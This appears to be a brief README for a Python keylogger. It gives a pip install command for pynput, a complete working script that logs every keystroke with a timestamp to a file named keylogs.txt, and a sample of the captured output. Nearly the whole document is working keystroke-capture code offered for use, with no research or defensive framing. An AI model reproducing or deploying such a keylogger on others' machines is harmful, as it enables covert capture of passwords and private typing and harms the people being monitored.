# python3_Keylogger
python3 keylogger

install 
python -m pip install pynput

```python
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
```
output as follow
```C#
2021-04-10 16:46:43,841: Key.backspace
2021-04-10 16:46:44,298: 'p'
2021-04-10 16:46:44,578: 'y'
2021-04-10 16:46:44,826: 't'
2021-04-10 16:46:44,922: 'h'
2021-04-10 16:46:45,154: 'o'
2021-04-10 16:46:45,354: 'n'
2021-04-10 16:46:45,898: <99>
2021-04-10 16:46:47,178: <193>
2021-04-10 16:46:48,114: Key.shift_r
2021-04-10 16:46:48,474: '+'
2021-04-10 16:46:49,298: Key.backspace
2021-04-10 16:46:50,346: Key.shift_r
```
